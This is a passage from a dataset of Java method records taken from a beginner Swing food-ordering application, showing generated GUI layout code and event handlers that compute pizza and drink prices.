java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldTax.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldTax.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldTaxActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldTotal.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jtxtfieldTotal.setHorizontalAlignment(javax.swing.JTextField.RIGHT);\n        jtxtfieldTotal.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldTotalActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);\n        jPanel4.setLayout(jPanel4Layout);\n        jPanel4Layout.setHorizontalGroup(\n            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel4Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addComponent(jlableSub)\n                    .addComponent(jlableSub1)\n                    .addComponent(jlableSub2))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)\n                    .addComponent(jtxtfieldTax, javax.swing.GroupLayout.DEFAULT_SIZE, 106, Short.MAX_VALUE)\n                    .addComponent(jtxtfieldSub)\n                    .addComponent(jtxtfieldTotal))\n                .addContainerGap())\n        );\n        jPanel4Layout.setVerticalGroup(\n            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(jPanel4Layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jlableSub, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldSub, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(30, 30, 30)\n                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jtxtfieldTax, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jlableSub1, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addGap(34, 34, 34)\n                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)\n                    .addComponent(jlableSub2, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addComponent(jtxtfieldTotal, javax.swing.GroupLayout.PREFERRED_SIZE, 42, javax.swing.GroupLayout.PREFERRED_SIZE))\n                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n        );\n\n        jtxtfieldStatus.setFont(new java.awt.Font(\"Tahoma\", 2, 18)); // NOI18N\n        jtxtfieldStatus.setHorizontalAlignment(javax.swing.JTextField.CENTER);\n        jtxtfieldStatus.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jtxtfieldStatusActionPerformed(evt);\n            }\n        });\n\n        jtxtfieldReceipt.setEditable(false);\n        jtxtfieldReceipt.setColumns(15);\n        jtxtfieldReceipt.setRows(5);\n        jScrollPane2.setViewportView(jtxtfieldReceipt);\n\n        jTextField1.setBackground(new java.awt.Color(255, 255, 102));\n        jTextField1.setFont(new java.awt.Font(\"Tahoma\", 1, 18)); // NOI18N\n        jTextField1.setHorizontalAlignment(javax.swing.JTextField.CENTER);\n        jTextField1.setText(\"Price List\");\n        jTextField1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField1ActionPerformed(evt);\n            }\n        });\n\n        jTextArea1.setColumns(11);\n        jTextArea1.setFont(new java.awt.Font(\"DejaVu Serif\", 1, 16)); // NOI18N\n        jTextArea1.setRows(20);\n        jTextArea1.setText(\"\\n\\n\\n   Product             Rs.\\n\\nSmall Pizza      149.00\\n\\nMedium Pizza   299.00\\n\\nLarge Pizza      499.00\\n\\nCoca Cola        40.00\\n\\nThums Up        40.00\\n\\nSprite              40.00\");\n        jScrollPane1.setViewportView(jTextArea1);\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addGroup(layout.createSequentialGroup()\n                        .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                        .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, 468, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))\n                .addGap(16, 16, 16)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(layout.createSequentialGroup()\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                            .addComponent(jPanel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                            .addComponent(jScrollPane2))\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                            .addComponent(jTextField1)\n                            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 228, Short.MAX_VALUE)))\n                    .addComponent(jtxtfieldStatus))\n                .addContainerGap())\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addContainerGap()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addGroup(layout.createSequentialGroup()\n                        .addComponent(jPanel4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addComponent(jScrollPane2))\n                    .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                    .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)\n                    .addGroup(layout.createSequentialGroup()\n                        .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, 41, javax.swing.GroupLayout.PREFERRED_SIZE)\n                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)\n                        .addComponent(jScrollPane1)))\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 9, Short.MAX_VALUE)\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)\n                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)\n                    .addComponent(jtxtfieldStatus))\n                .addContainerGap())\n        );\n\n        pack();\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32080, "method_name": "jbtnTotalActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnTotalActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jbtnTotalActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32081, "method_name": "jchkboxMpizzaActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jchkboxMpizzaActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jchkboxMpizzaActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32082, "method_name": "jchkboxSpizzaActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jchkboxSpizzaActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jchkboxSpizzaActionPerformed\n\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32083, "method_name": "jchkboxCocaActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jchkboxCocaActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jchkboxCocaActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32084, "method_name": "jchkboxThumsActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jchkboxThumsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jchkboxThumsActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32085, "method_name": "jchkboxSpriteActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jchkboxSpriteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jchkboxSpriteActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32086, "method_name": "jtxtfieldDrinkActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldDrinkActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldDrinkActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32087, "method_name": "jtxtfieldSubActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSubActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldSubActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32088, "method_name": "jtxtfieldTaxActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldTaxActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldTaxActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32089, "method_name": "jtxtfieldTotalActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldTotalActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldTotalActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32090, "method_name": "jtxtfieldThumsActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldThumsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldThumsActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32091, "method_name": "jbtnExitActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnExitActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jbtnExitActionPerformed\n        System.exit(0);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32092, "method_name": "jbtnResetActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnResetActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jbtnResetActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32093, "method_name": "jbtnResetMouseClicked", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnResetMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jbtnResetMouseClicked\n    jtxtfieldTotal.setText(null);\n     jtxtfieldCoca.setText(null);\n     jtxtfieldLarge.setText(null);\n     jtxtfieldMedium.setText(null);\n     jtxtfieldSmall.setText(null);\n     jtxtfieldSprite.setText(null);\n     jtxtfieldSub.setText(null);\n     jtxtfieldTax.setText(null);\n     jtxtfieldThums.setText(null);\n     jtxtfieldSmallP.setText(null);\n     jtxtfieldMediumP.setText(null);\n     jtxtfieldLargeP.setText(null);\n     jtxtfieldCocaP.setText(null);\n     jtxtfieldThumsP.setText(null);\n     jtxtfieldSpriteP.setText(null);\n    jchkboxSpizza.setSelected(false);\n    jchkboxMpizza.setSelected(false);\n    jchkboxLpizza.setSelected(false);\n    jchkboxCoca.setSelected(false);\n    jchkboxThums.setSelected(false);      \n    jchkboxSprite.setSelected(false);\n                                   \n                                   \n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32094, "method_name": "jtxtfieldCocaActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldCocaActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldCocaActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32095, "method_name": "jtxtfieldCocaPActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldCocaPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldCocaPActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32096, "method_name": "jtxtfieldThumsPActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldThumsPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldThumsPActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32097, "method_name": "jtxtfieldSpritePActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSpritePActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldSpritePActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32098, "method_name": "jtxtfieldSmallPActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSmallPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldSmallPActionPerformed\n        String EnterNumber=jtxtfieldSmall.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*SmallPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSmallP.setText(Price);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32099, "method_name": "jtxtfieldMediumActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldMediumActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32100, "method_name": "jtxtfieldLargePActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldLargePActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldLargePActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32101, "method_name": "jtxtfieldSpriteActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSpriteActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldSpriteActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32102, "method_name": "jbtnOrderActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnOrderActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jbtnOrderActionPerformed\n        \n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32103, "method_name": "jtxtfieldMealActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMealActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldMealActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32104, "method_name": "jbtnOrderMouseClicked", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jbtnOrderMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jbtnOrderMouseClicked\n        \n        jtxtfieldStatus.setText(\"Order received !!!\");\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32105, "method_name": "jTextField1ActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jTextField1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jTextField1ActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32106, "method_name": "jtxtfieldStatusActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldStatusActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldStatusActionPerformed\n        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32107, "method_name": "jtxtfieldSmallKeyPressed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSmallKeyPressed(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_jtxtfieldSmallKeyPressed\n        String EnterNumber=jtxtfieldSmall.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*SmallPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSmallP.setText(Price);\n        jchkboxSpizza.setSelected(true);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32108, "method_name": "jtxtfieldSmallFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSmallFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldSmallFocusLost\n        String EnterNumber=jtxtfieldSmall.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*SmallPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSmallP.setText(Price);\n        if(quantity>0)\n        {jchkboxSpizza.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32109, "method_name": "jtxtfieldMediumPFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumPFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldMediumPFocusLost\n        \n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32110, "method_name": "jtxtfieldMediumPActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumPActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldMediumPActionPerformed\n        String EnterNumber=jtxtfieldMedium.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*MediumPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldMediumP.setText(Price);\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32111, "method_name": "jtxtfieldMediumFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldMediumFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldMediumFocusLost\n        String EnterNumber=jtxtfieldMedium.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*MediumPizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldMediumP.setText(Price);\n        if(quantity>0)\n        {jchkboxMpizza.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32112, "method_name": "jtxtfieldLargeFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldLargeFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldLargeFocusLost\n        String EnterNumber=jtxtfieldLarge.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*LargePizza;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldLargeP.setText(Price);\n        if(quantity>0)\n        {jchkboxLpizza.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32113, "method_name": "jtxtfieldCocaFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldCocaFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldCocaFocusLost\n        String EnterNumber=jtxtfieldCoca.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*CocaCola;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldCocaP.setText(Price);\n        if(quantity>0)\n        {jchkboxCoca.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32114, "method_name": "jtxtfieldThumsFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldThumsFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldThumsFocusLost\n        String EnterNumber=jtxtfieldThums.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*ThumsUp;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldThumsP.setText(Price);\n        if(quantity>0)\n        {jchkboxThums.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32115, "method_name": "jtxtfieldSpriteFocusLost", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSpriteFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_jtxtfieldSpriteFocusLost\n        String EnterNumber=jtxtfieldSprite.getText();\n        double quantity=Double.parseDouble(EnterNumber);\n        double price=quantity*Sprite;\n        String Price=String.format(\"%.2f\", price);\n        jtxtfieldSpriteP.setText(Price);\n        if(quantity>0)\n        {jchkboxSprite.setSelected(true);}\n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32116, "method_name": "jtxtfieldSmallActionPerformed", "class_name": "FoodOrder", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jtxtfieldSmallActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jtxtfieldSmallActionPerformed\n          \n    }", "url": "https://raw.githubusercontent.com/priyanksondagar/Food-Ordering-System/master/FoodOrder.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 32117, "method_name": "jtxtfieldSmallFocusGained", "class_name": "FoodOrder", "params": ["java"], 